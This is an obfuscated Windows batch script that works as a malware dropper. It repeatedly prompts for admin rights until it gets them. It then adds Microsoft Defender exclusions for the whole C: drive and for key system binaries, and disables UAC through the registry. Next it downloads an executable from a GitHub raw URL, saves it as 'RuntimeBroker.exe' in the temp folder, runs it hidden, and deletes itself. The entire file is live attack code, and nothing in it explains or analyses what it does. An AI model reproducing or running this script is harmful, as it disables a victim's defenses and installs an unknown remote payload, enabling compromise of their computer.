@echo off & setlocal enableDelayedExpansion
set "dNfut=NET" & set "FsA=SESSION" & set "EqTF=>nul" & set "cpSF=2>&1"
%dNfut% %FsA% %EqTF% %cpSF%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "kYYjM=baz" & set "AapT=qux" & set "ByyNR=bar" & set "PnO=foo" & rem aFwRcC wClw bfoKmNB
set "FrJeX=powershell -ExecutionPolicy Bypass -Command"
set "oBcOA=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "zko='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "wylzv='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!FrJeX! "!oBcOA! !zko! !wylzv!" %EqTF% %cpSF%
set "rzrj=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "ivl=-Name 'EnableLUA' -Value 0"
!FrJeX! "!rzrj! !ivl!" %EqTF% %cpSF%
set "Eem=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!FrJeX! "!Eem!" %EqTF% %cpSF%
if !errorlevel! neq 0 (goto %a%)
set "guq=timeout /t" & !guq! 2 %EqTF% %cpSF%
set "fWhm=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "stpiC=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "WNbAY=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!FrJeX! "!fWhm! !stpiC! !WNbAY!" %EqTF% %cpSF%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!guq! 1 %EqTF% %cpSF% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %EqTF% %cpSF%
del /f /q "%~f0" %EqTF% %cpSF%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %EqTF% %cpSF%
if !errorlevel! neq 0 (!guq! 3 %EqTF% %cpSF% & goto %b%)
exit /b
